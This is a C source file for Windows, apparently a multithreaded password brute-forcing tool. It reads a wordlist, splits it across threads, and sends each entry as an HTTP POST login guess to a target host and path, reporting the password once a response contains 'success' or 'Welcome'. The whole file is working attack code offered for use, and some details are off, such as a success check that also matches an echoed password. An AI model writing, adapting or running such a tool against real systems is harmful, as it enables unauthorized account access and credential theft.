#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "winhttp.lib")

#define MAX_THREADS 10
#define MAX_PASSWORD_LEN 128
#define BUFFER_SIZE 4096

typedef struct {
    char host[256];
    char path[256];
    char **password;
    int start;
    int end;
} threadArgs;

char **load_wordlist(const char *filename, int *wordcount) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("Failed to open wordlist file");
        return NULL;
    }

    int capacity = 100;
    char **words = malloc(capacity * sizeof(char *));
    if (!words) {
        fclose(file);
        return NULL;
    }

    char buffer[MAX_PASSWORD_LEN];
    int count = 0;
    while (fgets(buffer, sizeof(buffer), file)) {
        size_t len = strlen(buffer);
        if (len > 0 && buffer[len - 1] == '\n')
            buffer[len - 1] = '\0';

        words[count] = malloc(strlen(buffer) + 1);
        if (!words[count]) {
            // Free previously allocated memory
            for (int i = 0; i < count; i++)
                free(words[i]);
            free(words);
            fclose(file);
            return NULL;
        }
        strcpy(words[count], buffer);
        count++;

        if (count >= capacity) {
            capacity *= 2;
            char **tmp = realloc(words, capacity * sizeof(char *));
            if (!tmp) {
                for (int i = 0; i < count; i++)
                    free(words[i]);
                free(words);
                fclose(file);
                return NULL;
            }
            words = tmp;
        }
    }

    fclose(file);
    *wordcount = count;
    return words;
}

volatile LONG password_found = 0;

int try_password(const char *host, const char *password, const char *path) {
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwBytesRead = 0;
    char response[BUFFER_SIZE] = {0};
    int result = 0;

    hInternet = InternetOpenA("BruteForceAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 0;

    hConnect = InternetConnectA(hInternet, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return 0;
    }

    hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 0;
    }

    char payload[BUFFER_SIZE];
    snprintf(payload, sizeof(payload), "password=%s", password);
    bResults = HttpSendRequestA(hRequest, "Content-Type: application/x-www-form-urlencoded", -1, payload, (DWORD)strlen(payload));
    if (bResults) {
        InternetReadFile(hRequest, response, sizeof(response) - 1, &dwBytesRead);
        response[dwBytesRead] = '\0';
        // Analyse response: if any response is received, treat as success (customize as needed)
        if (strstr(response, "success") || strstr(response, "Welcome") || strstr(response, password)) {
            result = 1;
        }
    }

    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    return result;
}

// Try a password using HTTP POST with WinINet, including username
int try_password_http(const char *host, const char *path, const char *username, const char *password) {
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwBytesRead = 0;
    char response[BUFFER_SIZE] = {0};
    int result = 0;

    hInternet = InternetOpenA("BruteForceAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 0;

    hConnect = InternetConnectA(hInternet, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return 0;
    }

    hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 0;
    }

    char payload[BUFFER_SIZE];
    snprintf(payload, sizeof(payload), "username=%s&password=%s", username, password);
    bResults = HttpSendRequestA(hRequest, "Content-Type: application/x-www-form-urlencoded", -1, payload, (DWORD)strlen(payload));
    if (bResults) {
        do {
            DWORD bytes = 0;
            if (InternetReadFile(hRequest, response + dwBytesRead, sizeof(response) - 1 - dwBytesRead, &bytes) && bytes > 0) {
                dwBytesRead += bytes;
            } else {
                break;
            }
        } while (dwBytesRead < sizeof(response) - 1);
        response[dwBytesRead] = '\0';
        // Analyse response: look for success/failure keywords
        if (strstr(response, "Welcome") || strstr(response, "success")) {
            result = 1;
        } else if (strstr(response, "Invalid") || strstr(response, "incorrect")) {
            result = 0;
        }
    }

    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    return result;
}


DWORD WINAPI brute_thread(LPVOID param) {
    threadArgs *args = (threadArgs *)param;
    for (int i = args->start; i < args->end; i++) {
        if (InterlockedCompareExchange(&password_found, 0, 0))
            break;
        if (try_password(args->host, args->password[i], args->path)) {
            printf("Password found: %s\n", args->password[i]);
            InterlockedExchange(&password_found, 1);
            break;
        }
    }
    return 0;
}


int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <host> <path> <wordlist>\n", argv[0]);
        return 1;
    }

    int wordcount = 0;
    char **wordlist = load_wordlist(argv[3], &wordcount);
    if (!wordlist) {
        fprintf(stderr, "Failed to load wordlist.\n");
        return 1;
    }

    int threads = MAX_THREADS;
    if (wordcount < threads)
        threads = wordcount;

    HANDLE thread_handles[MAX_THREADS];
    threadArgs args[MAX_THREADS];
    int chunk = wordcount / threads;
    int remainder = wordcount % threads;
    int start = 0;

    for (int i = 0; i < threads; i++) {
        args[i].start = start;
        args[i].end = start + chunk + (i < remainder ? 1 : 0);
        strncpy(args[i].host, argv[1], sizeof(args[i].host) - 1);
        args[i].host[sizeof(args[i].host) - 1] = '\0';
        strncpy(args[i].path, argv[2], sizeof(args[i].path) - 1);
        args[i].path[sizeof(args[i].path) - 1] = '\0';
        args[i].password = wordlist;
        thread_handles[i] = CreateThread(NULL, 0, brute_thread, &args[i], 0, NULL);
        start = args[i].end;
    }

    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);

    for (int i = 0; i < threads; i++)
        CloseHandle(thread_handles[i]);

    if (password_found) {
        // Clean up and exit if found
        for (int i = 0; i < wordcount; i++)
            free(wordlist[i]);
        free(wordlist);
        return 0;
    }
    printf("Password not found.\n");
    return 0;
}